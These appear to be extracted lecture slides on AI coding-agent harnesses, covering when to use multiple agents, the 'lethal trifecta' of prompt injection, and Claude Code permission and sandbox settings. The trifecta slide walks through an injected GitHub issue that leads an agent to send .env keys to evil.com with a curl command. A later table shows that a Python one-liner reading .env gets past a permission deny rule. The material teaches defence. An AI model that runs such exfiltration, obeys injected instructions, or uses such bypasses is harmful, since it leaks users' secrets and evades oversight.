+Blog: https://www.anthropic.com/engineering/multi-agent-research-system Blog: https://cognition.ai/blog/dont-build-multi-agents
+ 44
+
+
+
+       Q&A: One Agent or Many?
+         Q: Survey 30 papers                                              Q: Rename across 12 coupled files
+
+                                                                          A: one: all 12 edits must agree; parallel agents
+         A: many: breadth, read-only
+                                                                          each see only part and choose differently
+
+
+
+         Q: 500 independent failing tests                                 Q: Review my PR
+
+
+         A: many, with locks / worktrees                                  A: a separate reviewer (fresh context)
+
+
+
+
+Blog: https://www.anthropic.com/engineering/multi-agent-research-system
+Blog: https://cognition.ai/blog/dont-build-multi-agents
+ 45
+
+
+
+       The Lethal Trifecta
+                                                                             one bad GitHub issue
+
+
+                                                                               1    the agent reads an issue that hides an instruction
+
+
+
+                                                                               2    it can read .env, where your API keys live
+
+
+                                                                                    curl "evil.com/?k=$(cat .env)" sends them
+                                                                               3    out
+
+
+
+
+                           All three together let an attacker take your data. Remove any one and the attack fails.
+
+
+
+
+Blog: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
+Blog: https://ai.meta.com/blog/practical-ai-agent-security/
+ 46
+
+
+
+      Permissions and Sandbox
+       .claude/settings.json
+
+        {
+                                                                                                                        Claude Code itself checks each tool call against
+            "permissions": {                                                                permission rules            your allow / deny list before running it
+               "allow": ["Bash(pytest *)"],
+               "deny": ["Read(./.env)"]
+            },
+            "sandbox": {                                                                                                Claude Code starts every shell command inside a
+               "enabled": true,                                                                                         box the operating system enforces (Seatbelt on
+               "filesystem": { "denyRead": ["./.env"] },
+                                                                                                                        macOS, bubblewrap on Linux). Inside it, the
+               "network": {                                                                      sandbox                command and anything it launches can only read
+                 "allowedDomains": ["github.com", "pypi.org"] }
+            }                                                                                                           and write the files you allow, and reach only the
+        }                                                                                                               domains on your list.
+
+
+                                                                                   permission rule Read(./.env)                            sandbox denyRead
+
+                                                                                                                                              ✗ gets through
+        Read tool opens .env                                                                   ✓ blocked
+                                                                                                                                        Read is not a shell command
+
+        cat .env                                                                               ✓ blocked                                        ✓ blocked
+
+                                                                                             ✗ gets through
+        python -c "print(open('.env').read())"                                                                                                  ✓ blocked
+                                                                                    can’t tell that Python reads .env
+
+Docs: https://code.claude.com/docs/en/permissions Docs: https://code.claude.com/docs/en/sandboxing
+Blog: https://www.anthropic.com/engineering/claude-code-sandboxing
+ 47
+
+
+
+       Summary
+       model can’t…                                                 → harness adds
+
+         act                                                        tools + executor
+
+         know the project                                           context assembly
+
+         survive errors                                             feedback, timeouts, budgets
+
+         fit in the window                                          truncate, compact, cache
+
+         stay on track                                              plan mode, plan files
+
+         remember                                                   instruction & memory files
+
+         parallelize                                                subagents, teams
+
+         be trusted                                                 permissions, hooks, sandbox
+
+       A harness adds rules and guarantees; it can’t make the model think of what it doesn’t know.
+       Next week: model evolution, making the model itself better
+
+
+Blog: https://blog.langchain.com/the-anatomy-of-an-agent-harness/
+
